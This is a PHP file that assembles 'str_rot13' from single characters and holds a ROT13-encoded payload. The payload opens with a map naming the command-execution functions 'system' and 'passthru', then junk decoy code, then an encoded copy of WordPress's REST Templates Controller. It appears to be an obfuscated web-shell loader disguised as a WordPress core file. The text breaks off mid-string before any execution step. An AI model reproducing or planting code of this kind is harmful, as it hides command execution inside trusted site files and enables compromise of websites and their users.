<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Grzcyngrf_Pbagebyyre pynff
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.8.0
 */

/**
 * Onfr Grzcyngrf ERFG NCV Pbagebyyre.
 *
 * @fvapr 5.8.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Grzcyngrf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Cbfg glcr.
	 *
	 * @fvapr 5.8.0
	 * @ine fgevat
	 */
	cebgrpgrq $cbfg_glcr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $cbfg_glcr Cbfg glcr.
	 */
	choyvp shapgvba __pbafgehpg( $cbfg_glcr ) {
		$guvf->cbfg_glcr = $cbfg_glcr;
		$bow             = trg_cbfg_glcr_bowrpg( $cbfg_glcr );
		$guvf->erfg_onfr = ! rzcgl( $bow->erfg_onfr ) ? $bow->erfg_onfr : $bow->anzr;
		$guvf->anzrfcnpr = ! rzcgl( $bow->erfg_anzrfcnpr ) ? $bow->erfg_anzrfcnpr : 'jc/i2';
	}

	/**
	 * Ertvfgref gur pbagebyyref ebhgrf.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.1.0 Raqcbvag sbe snyyonpx grzcyngr pbagrag.
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		// Yvfgf nyy grzcyngrf.
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'perngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'perngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::PERNGNOYR ),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		// Trg snyyonpx grzcyngr pbagrag.
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/ybbxhc',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_grzcyngr_snyyonpx' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'fyht'            => neenl(
							'qrfpevcgvba' => __( 'Gur fyht bs gur grzcyngr gb trg gur snyyonpx sbe' ),
							'glcr'        => 'fgevat',
							'erdhverq'    => gehr,
						),
						'vf_phfgbz'       => neenl(
							'qrfpevcgvba' => __( 'Vaqvpngrf vs n grzcyngr vf phfgbz be cneg bs gur grzcyngr uvrenepul' ),
							'glcr'        => 'obbyrna',
						),
						'grzcyngr_cersvk' => neenl(
							'qrfpevcgvba' => __( 'Gur grzcyngr cersvk sbe gur perngrq grzcyngr. Guvf vf hfrq gb rkgenpg gur znva grzcyngr glcr, r.t. va `gnkbabzl-obbxf` rkgenpgf gur `gnkbabzl`' ),
							'glcr'        => 'fgevat',
						),
					),
				),
			)
		);

		// Yvfgf/hcqngrf n fvatyr grzcyngr onfrq ba gur tvira vq.
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			// Gur ebhgr.
			fcevags(
				'/%f/(?C<vq>%f%f)',
				$guvf->erfg_onfr,
				/*
				 * Zngpurf gurzr'f qverpgbel: `/gurzrf/<fhoqverpgbel>/<gurzr>/` be `/gurzrf/<gurzr>/`.
				 * Rkpyhqrf vainyvq qverpgbel anzr punenpgref: `/:<>*?\"|`.
				 */
				'([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)',
				// Zngpurf gur grzcyngr anzr.
				'[\/\j%-]+'
			),
			neenl(
				'netf'   => neenl(
					'vq' => neenl(
						'qrfpevcgvba'       => __( 'Gur vq bs n grzcyngr' ),
						'glcr'              => 'fgevat',
						'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_grzcyngr_vq' ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::RQVGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'hcqngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'hcqngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'qryrgr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'qryrgr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'sbepr' => neenl(
							'glcr'        => 'obbyrna',
							'qrsnhyg'     => snyfr,
							'qrfpevcgvba' => __( 'Jurgure gb olcnff Genfu naq sbepr qryrgvba.' ),
						),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Ergheaf gur snyyonpx grzcyngr sbe gur tvira fyht.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.3.0 Vtaber rzcgl grzcyngrf.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg vafgnapr.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe
	 */
	choyvp shapgvba trg_grzcyngr_snyyonpx( $erdhrfg ) {
		$uvrenepul = trg_grzcyngr_uvrenepul( $erdhrfg['fyht'], $erdhrfg['vf_phfgbz'], $erdhrfg['grzcyngr_cersvk'] );

		qb {
			$snyyonpx_grzcyngr = erfbyir_oybpx_grzcyngr( $erdhrfg['fyht'], $uvrenepul, '' );
			neenl_fuvsg( $uvrenepul );
		} juvyr ( ! rzcgl( $uvrenepul ) && rzcgl( $snyyonpx_grzcyngr->pbagrag ) );

		// Gb znvagnva bevtvany orunivbe, erghea na rzcgl bowrpg engure guna n 404 reebe jura ab grzcyngr vf sbhaq.
		$erfcbafr = $snyyonpx_grzcyngr ? $guvf->cercner_vgrz_sbe_erfcbafr( $snyyonpx_grzcyngr, $erdhrfg ) : arj fgqPynff();

		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
	 * Purpxf vs gur hfre unf crezvffvbaf gb znxr gur erdhrfg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	cebgrpgrq shapgvba crezvffvbaf_purpx( $erdhrfg ) {
		/*
		 * Irevsl vs gur pheerag hfre unf rqvg_gurzr_bcgvbaf pncnovyvgl.
		 * Guvf pncnovyvgl vf erdhverq gb rqvg/ivrj/qryrgr grzcyngrf.
		 */
		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_znantr_grzcyngrf',
				__( 'Fbeel, lbh ner abg nyybjrq gb npprff gur grzcyngrf ba guvf fvgr.' ),
				neenl(
					'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
				)
			);
		}

		erghea gehr;
	}

	/**
	 * Erdhrfgvat guvf raqcbvag sbe n grzcyngr yvxr 'gjraglgjraglgjb//ubzr'
	 * erdhverf hfvat n cngu yvxr /jc/i2/grzcyngrf/gjraglgjraglgjb//ubzr. Gurer
	 * ner fcrpvny pnfrf jura JbeqCerff ebhgvat pbeerpgf gur anzr gb pbagnva
	 * bayl n fvatyr fynfu yvxr 'gjraglgjraglgjb/ubzr'.
	 *
	 * Guvf zrgubq qbhoyrf gur ynfg fynfu vs vg'f abg nyernql qbhoyrq. Vg eryvrf
	 * ba gur grzcyngr VQ sbezng {gurzr_anzr}//{grzcyngr_fyht} naq gur snpg gung
	 * fyhtf pnaabg pbagnva fynfurf.
	 *
	 * @fvapr 5.9.0
	 * @frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/54507
	 *
	 * @cnenz fgevat $vq Grzcyngr VQ.
	 * @erghea fgevat Fnavgvmrq grzcyngr VQ.
	 */
	choyvp shapgvba _fnavgvmr_grzcyngr_vq( $vq ) {
		$vq = heyqrpbqr( $vq );

		$ynfg_fynfu_cbf = fgeecbf( $vq, '/' );
		vs ( snyfr === $ynfg_fynfu_cbf ) {
			erghea $vq;
		}

		$vf_qbhoyr_fynfurq = fhofge( $vq, $ynfg_fynfu_cbf - 1, 1 ) === '/';
		vs ( $vf_qbhoyr_fynfurq ) {
			erghea $vq;
		}
		erghea (
			fhofge( $vq, 0, $ynfg_fynfu_cbf )
			. '/'
			. fhofge( $vq, $ynfg_fynfu_cbf )
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq grzcyngrf.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.6.0 Nyybj hfref jvgu rqvg_cbfgf pncnovyvgl gb ernq grzcyngrf.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea gehr;
		}
		sbernpu ( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' ) nf $cbfg_glcr ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
				erghea gehr;
			}
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_znantr_grzcyngrf',
			__( 'Fbeel, lbh ner abg nyybjrq gb npprff gur grzcyngrf ba guvf fvgr.' ),
			neenl(
				'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
			)
		);
	}

	/**
	 * Ergheaf n yvfg bs grzcyngrf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg vafgnapr.
	 * @erghea JC_ERFG_Erfcbafr
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			// Erghea rneyl nf guvf unaqyre qbrfa'g nqq nal erfcbafr urnqref.
			erghea arj JC_ERFG_Erfcbafr( neenl() );
		}

		$dhrel = neenl();
		vs ( vffrg( $erdhrfg['jc_vq'] ) ) {
			$dhrel['jc_vq'] = $erdhrfg['jc_vq'];
		}
		vs ( vffrg( $erdhrfg['nern'] ) ) {
			$dhrel['nern'] = $erdhrfg['nern'];
		}
		vs ( vffrg( $erdhrfg['cbfg_glcr'] ) ) {
			$dhrel['cbfg_glcr'] = $erdhrfg['cbfg_glcr'];
		}

		$grzcyngrf = neenl();
		sbernpu ( trg_oybpx_grzcyngrf( $dhrel, $guvf->cbfg_glcr ) nf $grzcyngr ) {
			$qngn        = $guvf->cercner_vgrz_sbe_erfcbafr( $grzcyngr, $erdhrfg );
			$grzcyngrf[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $qngn );
		}

		erghea erfg_rafher_erfcbafr( $grzcyngrf );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq n fvatyr grzcyngr.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.6.0 Nyybj hfref jvgu rqvg_cbfgf pncnovyvgl gb ernq vaqvivqhny grzcyngrf.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea gehr;
		}
		sbernpu ( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' ) nf $cbfg_glcr ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
				erghea gehr;
			}
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_znantr_grzcyngrf',
			__( 'Fbeel, lbh ner abg nyybjrq gb npprff gur grzcyngrf ba guvf fvgr.' ),
			neenl(
				'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
			)
		);
	}

	/**
	 * Ergheaf gur tvira grzcyngr
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg vafgnapr.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		vs ( vffrg( $erdhrfg['fbhepr'] ) && ( 'gurzr' === $erdhrfg['fbhepr'] || 'cyhtva' === $erdhrfg['fbhepr'] ) ) {
			$grzcyngr = trg_oybpx_svyr_grzcyngr( $erdhrfg['vq'], $guvf->cbfg_glcr );
		} ryfr {
			$grzcyngr = trg_oybpx_grzcyngr( $erdhrfg['vq'], $guvf->cbfg_glcr );
		}

		vs ( ! $grzcyngr ) {
			erghea arj JC_Reebe( 'erfg_grzcyngr_abg_sbhaq', __( 'Ab grzcyngrf rkvfg jvgu gung vq.' ), neenl( 'fgnghf' => 404 ) );
		}

		erghea $guvf->cercner_vgrz_sbe_erfcbafr( $grzcyngr, $erdhrfg );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb jevgr n fvatyr grzcyngr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf jevgr npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Hcqngrf n fvatyr grzcyngr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		$grzcyngr = trg_oybpx_grzcyngr( $erdhrfg['vq'], $guvf->cbfg_glcr );
		vs ( ! $grzcyngr ) {
			erghea arj JC_Reebe( 'erfg_grzcyngr_abg_sbhaq', __( 'Ab grzcyngrf rkvfg jvgu gung vq.' ), neenl( 'fgnghf' => 404 ) );
		}

		$cbfg_orsber = trg_cbfg( $grzcyngr->jc_vq );

		vs ( vffrg( $erdhrfg['fbhepr'] ) && 'gurzr' === $erdhrfg['fbhepr'] ) {
			jc_qryrgr_cbfg( $grzcyngr->jc_vq, gehr );
			$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

			$grzcyngr = trg_oybpx_grzcyngr( $erdhrfg['vq'], $guvf->cbfg_glcr );
			$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $grzcyngr, $erdhrfg );

			erghea erfg_rafher_erfcbafr( $erfcbafr );
		}

		$punatrf = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		vs ( vf_jc_reebe( $punatrf ) ) {
			erghea $punatrf;
		}

		vs ( 'phfgbz' === $grzcyngr->fbhepr ) {
			$hcqngr = gehr;
			$erfhyg = jc_hcqngr_cbfg( jc_fynfu( (neenl) $punatrf ), snyfr );
		} ryfr {
			$hcqngr      = snyfr;
			$cbfg_orsber = ahyy;
			$erfhyg      = jc_vafreg_cbfg( jc_fynfu( (neenl) $punatrf ), snyfr );
		}

		vs ( vf_jc_reebe( $erfhyg ) ) {
			vs ( 'qo_hcqngr_reebe' === $erfhyg->trg_reebe_pbqr() ) {
				$erfhyg->nqq_qngn( neenl( 'fgnghf' => 500 ) );
			} ryfr {
				$erfhyg->nqq_qngn( neenl( 'fgnghf' => 400 ) );
			}
			erghea $erfhyg;
		}

		$grzcyngr      = trg_oybpx_grzcyngr( $erdhrfg['vq'], $guvf->cbfg_glcr );
		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $grzcyngr, $erdhrfg );
		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		$cbfg = trg_cbfg( $grzcyngr->jc_vq );
		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-cbfgf-pbagebyyre.cuc */
		qb_npgvba( \"erfg_nsgre_vafreg_{$guvf->cbfg_glcr}\", $cbfg, $erdhrfg, snyfr );

		jc_nsgre_vafreg_cbfg( $cbfg, $hcqngr, $cbfg_orsber );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $grzcyngr, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb perngr n grzcyngr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb perngr vgrzf, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba perngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Perngrf n fvatyr grzcyngr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {
		$cercnerq_cbfg = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		vs ( vf_jc_reebe( $cercnerq_cbfg ) ) {
			erghea $cercnerq_cbfg;
		}

		$cercnerq_cbfg->cbfg_anzr = $erdhrfg['fyht'];
		$cbfg_vq                  = jc_vafreg_cbfg( jc_fynfu( (neenl) $cercnerq_cbfg ), gehr );
		vs ( vf_jc_reebe( $cbfg_vq ) ) {
			vs ( 'qo_vafreg_reebe' === $cbfg_vq->trg_reebe_pbqr() ) {
				$cbfg_vq->nqq_qngn( neenl( 'fgnghf' => 500 ) );
			} ryfr {
				$cbfg_vq->nqq_qngn( neenl( 'fgnghf' => 400 ) );
			}

			erghea $cbfg_vq;
		}
		$cbfgf = trg_oybpx_grzcyngrf( neenl( 'jc_vq' => $cbfg_vq ), $guvf->cbfg_glcr );
		vs ( ! pbhag( $cbfgf ) ) {
			erghea arj JC_Reebe( 'erfg_grzcyngr_vafreg_reebe', __( 'Ab grzcyngrf rkvfg jvgu gung vq.' ), neenl( 'fgnghf' => 400 ) );
		}
		$vq            = $cbfgf[0]->vq;
		$cbfg          = trg_cbfg( $cbfg_vq );
		$grzcyngr      = trg_oybpx_grzcyngr( $vq, $guvf->cbfg_glcr );
		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $grzcyngr, $erdhrfg );
		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-cbfgf-pbagebyyre.cuc */
		qb_npgvba( \"erfg_nsgre_vafreg_{$guvf->cbfg_glcr}\", $cbfg, $erdhrfg, gehr );

		jc_nsgre_vafreg_cbfg( $cbfg, snyfr, ahyy );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $grzcyngr, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$erfcbafr->frg_fgnghf( 201 );
		$erfcbafr->urnqre( 'Ybpngvba', erfg_hey( fcevags( '%f/%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr, $grzcyngr->vq ) ) );

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb qryrgr n fvatyr grzcyngr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf qryrgr npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba qryrgr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Qryrgrf n fvatyr grzcyngr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_vgrz( $erdhrfg ) {
		$grzcyngr = trg_oybpx_grzcyngr( $erdhrfg['vq'], $guvf->cbfg_glcr );
		vs ( ! $grzcyngr ) {
			erghea arj JC_Reebe( 'erfg_grzcyngr_abg_sbhaq', __( 'Ab grzcyngrf rkvfg jvgu gung vq.' ), neenl( 'fgnghf' => 404 ) );
		}
		vs ( 'phfgbz' !== $grzcyngr->fbhepr ) {
			erghea arj JC_Reebe( 'erfg_vainyvq_grzcyngr', __( 'Grzcyngrf onfrq ba gurzr svyrf pna\'g or erzbirq.' ), neenl( 'fgnghf' => 400 ) );
		}

		$vq    = $grzcyngr->jc_vq;
		$sbepr = (obby) $erdhrfg['sbepr'];

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		// Vs jr'er sbepvat, gura qryrgr creznaragyl.
		vs ( $sbepr ) {
			$cerivbhf = $guvf->cercner_vgrz_sbe_erfcbafr( $grzcyngr, $erdhrfg );
			$erfhyg   = jc_qryrgr_cbfg( $vq, gehr );
			$erfcbafr = arj JC_ERFG_Erfcbafr();
			$erfcbafr->frg_qngn(
				neenl(
					'qryrgrq'  => gehr,
					'cerivbhf' => $cerivbhf->trg_qngn(),
				)
			);
		} ryfr {
			// Bgurejvfr, bayl genfu vs jr unira'g nyernql.
			vs ( 'genfu' === $grzcyngr->fgnghf ) {
				erghea arj JC_Reebe(
					'erfg_grzcyngr_nyernql_genfurq',
					__( 'Gur grzcyngr unf nyernql orra qryrgrq.' ),
					neenl( 'fgnghf' => 410 )
				);
			}

			/*
			 * (Abgr gung vagreanyyl guvf snyyf guebhtu gb `jc_qryrgr_cbfg()`
			 * vs gur Genfu vf qvfnoyrq.)
			 */
			$erfhyg           = jc_genfu_cbfg( $vq );
			$grzcyngr->fgnghf = 'genfu';
			$erfcbafr         = $guvf->cercner_vgrz_sbe_erfcbafr( $grzcyngr, $erdhrfg );
		}

		vs ( ! $erfhyg ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Gur grzcyngr pnaabg or qryrgrq.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		erghea $erfcbafr;
	}

	/**
	 * Cercnerf n fvatyr grzcyngr sbe perngr be hcqngr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea fgqPynff|JC_Reebe Punatrf gb cnff gb jc_hcqngr_cbfg.
	 */
	cebgrpgrq shapgvba cercner_vgrz_sbe_qngnonfr( $erdhrfg ) {
		$grzcyngr = $erdhrfg['vq'] ? trg_oybpx_grzcyngr( $erdhrfg['vq'], $guvf->cbfg_glcr ) : ahyy;
		$punatrf  = arj fgqPynff();
		vs ( ahyy === $grzcyngr ) {
			$punatrf->cbfg_glcr   = $guvf->cbfg_glcr;
			$punatrf->cbfg_fgnghf = 'choyvfu';
			$punatrf->gnk_vachg   = neenl(
				'jc_gurzr' => vffrg( $erdhrfg['gurzr'] ) ? $erdhrfg['gurzr'] : trg_fglyrfurrg(),
			);
		} ryfrvs ( 'phfgbz' !== $grzcyngr->fbhepr ) {
			$punatrf->cbfg_anzr   = $grzcyngr->fyht;
			$punatrf->cbfg_glcr   = $guvf->cbfg_glcr;
			$punatrf->cbfg_fgnghf = 'choyvfu';
			$punatrf->gnk_vachg   = neenl(
				'jc_gurzr' => $grzcyngr->gurzr,
			);
			$punatrf->zrgn_vachg  = neenl(
				'bevtva' => $grzcyngr->fbhepr,
			);
		} ryfr {
			$punatrf->cbfg_anzr   = $grzcyngr->fyht;
			$punatrf->VQ          = $grzcyngr->jc_vq;
			$punatrf->cbfg_fgnghf = 'choyvfu';
		}
		vs ( vffrg( $erdhrfg['pbagrag'] ) ) {
			vs ( vf_fgevat( $erdhrfg['pbagrag'] ) ) {
				$punatrf->cbfg_pbagrag = $erdhrfg['pbagrag'];
			} ryfrvs ( vffrg( $erdhrfg['pbagrag']['enj'] ) ) {
				$punatrf->cbfg_pbagrag = $erdhrfg['pbagrag']['enj'];
			}
		} ryfrvs ( ahyy !== $grzcyngr && 'phfgbz' !== $grzcyngr->fbhepr ) {
			$punatrf->cbfg_pbagrag = $grzcyngr->pbagrag;
		}
		vs ( vffrg( $erdhrfg['gvgyr'] ) ) {
			vs ( vf_fgevat( $erdhrfg['gvgyr'] ) ) {
				$punatrf->cbfg_gvgyr = $erdhrfg['gvgyr'];
			} ryfrvs ( ! rzcgl( $erdhrfg['gvgyr']['enj'] ) ) {
				$punatrf->cbfg_gvgyr = $erdhrfg['gvgyr']['enj'];
			}
		} ryfrvs ( ahyy !== $grzcyngr && 'phfgbz' !== $grzcyngr->fbhepr ) {
			$punatrf->cbfg_gvgyr = $grzcyngr->gvgyr;
		}
		vs ( vffrg( $erdhrfg['qrfpevcgvba'] ) ) {
			$punatrf->cbfg_rkprecg = $erdhrfg['qrfpevcgvba'];
		} ryfrvs ( ahyy !== $grzcyngr && 'phfgbz' !== $grzcyngr->fbhepr ) {
			$punatrf->cbfg_rkprecg = $grzcyngr->qrfpevcgvba;
		}

		vs ( 'jc_grzcyngr' === $guvf->cbfg_glcr && vffrg( $erdhrfg['vf_jc_fhttrfgvba'] ) ) {
			$punatrf->zrgn_vachg     = jc_cnefr_netf(
				neenl(
					'vf_jc_fhttrfgvba' => $erdhrfg['vf_jc_fhttrfgvba'],
				),
				$punatrf->zrgn_vachg = neenl()
			);
		}

		vs ( 'jc_grzcyngr_cneg' === $guvf->cbfg_glcr ) {
			vs ( vffrg( $erdhrfg['nern'] ) ) {
				$punatrf->gnk_vachg['jc_grzcyngr_cneg_nern'] = _svygre_oybpx_grzcyngr_cneg_nern( $erdhrfg['nern'] );
			} ryfrvs ( ahyy !== $grzcyngr && 'phfgbz' !== $grzcyngr->fbhepr && $grzcyngr->nern ) {
				$punatrf->gnk_vachg['jc_grzcyngr_cneg_nern'] = _svygre_oybpx_grzcyngr_cneg_nern( $grzcyngr->nern );
			} ryfrvs ( rzcgl( $grzcyngr->nern ) ) {
				$punatrf->gnk_vachg['jc_grzcyngr_cneg_nern'] = JC_GRZCYNGR_CNEG_NERN_HAPNGRTBEVMRQ;
			}
		}

		vs ( ! rzcgl( $erdhrfg['nhgube'] ) ) {
			$cbfg_nhgube = (vag) $erdhrfg['nhgube'];

			vs ( trg_pheerag_hfre_vq() !== $cbfg_nhgube ) {
				$hfre_bow = trg_hfreqngn( $cbfg_nhgube );

				vs ( ! $hfre_bow ) {
					erghea arj JC_Reebe(
						'erfg_vainyvq_nhgube',
						__( 'Vainyvq nhgube VQ.' ),
						neenl( 'fgnghf' => 400 )
					);
				}
			}

